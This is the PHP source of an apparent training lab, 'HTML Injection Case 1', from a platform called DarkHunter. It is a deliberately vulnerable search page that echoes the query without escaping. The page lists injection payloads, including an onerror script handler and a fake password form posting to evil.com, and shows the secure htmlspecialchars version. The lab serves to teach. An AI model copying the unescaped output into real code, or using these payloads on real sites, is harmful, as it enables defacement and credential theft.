<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['HTML-Injection']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['html_case1_attempts'])) {
  $_SESSION['html_case1_attempts'] = 0;
}
if (!isset($_SESSION['html_case1_solved'])) {
  $_SESSION['html_case1_solved'] = false;
}

// ─── Simulated Search Data ───────────────────────────────────────────────
$search_data = [
  ['title' => 'DarkHunter Documentation', 'url' => '/docs', 'snippet' => 'Complete documentation for DarkHunter security platform.'],
  ['title' => 'Getting Started Guide', 'url' => '/guide', 'snippet' => 'Learn the basics of penetration testing with DarkHunter.'],
  ['title' => 'API Reference', 'url' => '/api', 'snippet' => 'RESTful API documentation for integrations.'],
  ['title' => 'Community Forum', 'url' => '/forum', 'snippet' => 'Join the cybersecurity community discussions.'],
  ['title' => 'Report a Bug', 'url' => '/bugs', 'snippet' => 'Submit security vulnerabilities and bug reports.'],
];

// ─── Vulnerable Search Logic ─────────────────────────────────────────────
$search_query = $_GET['q'] ?? '';
$search_results = [];
$html_injected = false;
$flag_triggered = false;

if (!empty($search_query)) {
  // VULNERABLE: User input reflected directly without htmlspecialchars()
  // This allows HTML tags to be rendered in the browser

  // Check for HTML injection
  if (preg_match('/<[a-zA-Z][^>]*>/', $search_query)) {
    $html_injected = true;

    // Check for specific flag-triggering payloads
    if (
      stripos($search_query, '<h1') !== false || stripos($search_query, '<script') !== false ||
      stripos($search_query, '<img') !== false || stripos($search_query, '<a') !== false ||
      stripos($search_query, '<div') !== false || stripos($search_query, '<span') !== false ||
      stripos($search_query, '<marquee') !== false || stripos($search_query, '<blink') !== false
    ) {
      $flag_triggered = true;
    }
  }

  // Normal search logic
  foreach ($search_data as $item) {
    if (
      stripos($item['title'], strip_tags($search_query)) !== false ||
      stripos($item['snippet'], strip_tags($search_query)) !== false
    ) {
      $search_results[] = $item;
    }
  }
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['html_case1_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['html_case1_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['html_case1_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a Reflected HTML Injection vulnerability. By injecting raw HTML tags into the search query, you demonstrated how unescaped user input can manipulate the page structure and content!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['q'])) {
  $_SESSION['html_case1_attempts']++;
}

$attempts = $_SESSION['html_case1_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Search - HTML Injection Case 1 (Basic Reflected)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/HTML-CASE1.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to HTML Injection Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge easy"><i class="fas fa-seedling"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-search"></i> DarkHunter Search Engine</h1>
      <p class="lab-description">Search our knowledge base and documentation. This beginner-friendly HTML Injection
        challenge reflects user input directly in the page. <strong>No output encoding applied!</strong> Inject HTML
        tags to manipulate the page.</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this HTML Injection vulnerability. You can continue exploring, but no additional
          points will be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Search Section -->
    <div class="search-container">

      <!-- Search Form (Vulnerable) -->
      <div class="search-box">
        <form method="GET" action="" class="search-form" id="search-form">
          <div class="search-input-wrapper">
            <i class="fas fa-search search-icon"></i>
            <input type="text" name="q" placeholder="Search documentation, guides, APIs..." class="search-input"
              value="<?php echo $search_query; ?>">
            <button type="submit" class="search-btn">
              <i class="fas fa-arrow-right"></i>
            </button>
          </div>
        </form>

        <!-- VULNERABLE: Raw reflection of search query -->
        <?php if (!empty($search_query)): ?>
        <div class="search-reflection">
          <span class="reflection-label">You searched for:</span>
          <span class="reflection-value"><?php echo $search_query; ?></span>
        </div>
        <?php endif; ?>
      </div>

      <!-- Injection Status -->
      <?php if ($html_injected): ?>
      <div class="injection-alert">
        <i class="fas fa-exclamation-triangle"></i>
        <div class="injection-content">
          <strong>HTML Injection Detected!</strong>
          <span>Raw HTML tags were detected in your input and rendered without sanitization.</span>
        </div>
      </div>
      <?php endif; ?>

      <!-- Search Results -->
      <div class="results-container">
        <?php if (!empty($search_query)): ?>
        <div class="results-header">
          <h3><i class="fas fa-list"></i> Search Results</h3>
          <span class="results-count"><?php echo count($search_results); ?> results found</span>
        </div>

        <?php if (empty($search_results)): ?>
        <div class="no-results">
          <i class="fas fa-inbox"></i>
          <p>No results found for your query. Try injecting HTML tags instead!</p>
          <div class="suggestion-box">
            <span class="suggestion-label">Try these payloads:</span>
            <code>&lt;h1&gt;Hacked!&lt;/h1&gt;</code>
            <code>&lt;marquee&gt;HTML Injection&lt;/marquee&gt;</code>
            <code>&lt;div style="color:red"&gt;Defaced!&lt;/div&gt;</code>
          </div>
        </div>
        <?php else: ?>
        <div class="results-list">
          <?php foreach ($search_results as $result): ?>
          <div class="result-item">
            <div class="result-icon">
              <i class="fas fa-file-alt"></i>
            </div>
            <div class="result-content">
              <a href="<?php echo htmlspecialchars($result['url']); ?>" class="result-title">
                <?php echo htmlspecialchars($result['title']); ?>
              </a>
              <span class="result-url"><?php echo htmlspecialchars($result['url']); ?></span>
              <p class="result-snippet"><?php echo htmlspecialchars($result['snippet']); ?></p>
            </div>
          </div>
          <?php endforeach; ?>
        </div>
        <?php endif; ?>
        <?php endif; ?>
      </div>

      <!-- HTML Payload Examples -->
      <div class="payloads-card">
        <div class="card-header">
          <i class="fas fa-code"></i>
          <h3>Common HTML Injection Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Heading Injection</div>
            <code class="payload-code">&lt;h1 style="color:red"&gt;PWNED&lt;/h1&gt;</code>
            <span class="payload-effect">Injects large styled heading</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Image Injection</div>
            <code class="payload-code">&lt;img src="x" onerror="alert(1)"&gt;</code>
            <span class="payload-effect">Attempts to load image with error handler</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Link Injection</div>
            <code class="payload-code">&lt;a href="https://evil.com"&gt;Click Me&lt;/a&gt;</code>
            <span class="payload-effect">Creates malicious hyperlink</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Form Injection</div>
            <code
              class="payload-code">&lt;form action="https://evil.com"&gt;&lt;input type="password"&gt;&lt;/form&gt;</code>
            <span class="payload-effect">Injects fake login form</span>
          </div>
        </div>
      </div>

      <!-- Page Source Preview -->
      <div class="source-card">
        <div class="card-header">
          <i class="fas fa-file-code"></i>
          <h3>Vulnerable Code Snippet</h3>
        </div>
        <div class="source-code">
          <pre><code>&lt;!-- VULNERABLE: Direct output without encoding --&gt;
&lt;span class="reflection-value"&gt;
  &lt;?php echo $search_query; ?&gt;  &lt;!-- NO htmlspecialchars()! --&gt;
&lt;/span&gt;

&lt;!-- SECURE: With proper encoding --&gt;
&lt;span class="reflection-value"&gt;
  &lt;?php echo htmlspecialchars($search_query); ?&gt;
&lt;/span&gt;</code></pre>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Query Param: <?php echo $search_query ?: 'None'; ?></span>
          <span>HTML Injected: <?php echo $html_injected ? 'YES' : 'NO'; ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">The search page reflects your input directly without using <code>htmlspecialchars()</code>.
        Try typing HTML tags like <code>&lt;h1&gt;Test&lt;/h1&gt;</code> in the search box and see if they render as
        actual HTML elements.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">You can inject any HTML tag to modify the page. Try injecting a styled div:
        <code>&lt;div style="background:red;color:white;padding:20px"&gt;HACKED&lt;/div&gt;</code> or create a fake form
        to demonstrate the impact.
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Inject any valid HTML tag to trigger the flag. Simple payloads like
        <code>&lt;h1&gt;PWNED&lt;/h1&gt;</code>, <code>&lt;marquee&gt;HTML Injection&lt;/marquee&gt;</code>, or
        <code>&lt;div style="color:red"&gt;Defaced&lt;/div&gt;</code> will be detected and solve the challenge!
      </div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  window.addEventListener('load', function() {
    const injectionAlert = document.querySelector('.injection-alert');
    const alreadySolved = document.querySelector('.solved-banner');

    if (injectionAlert && !alreadySolved) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>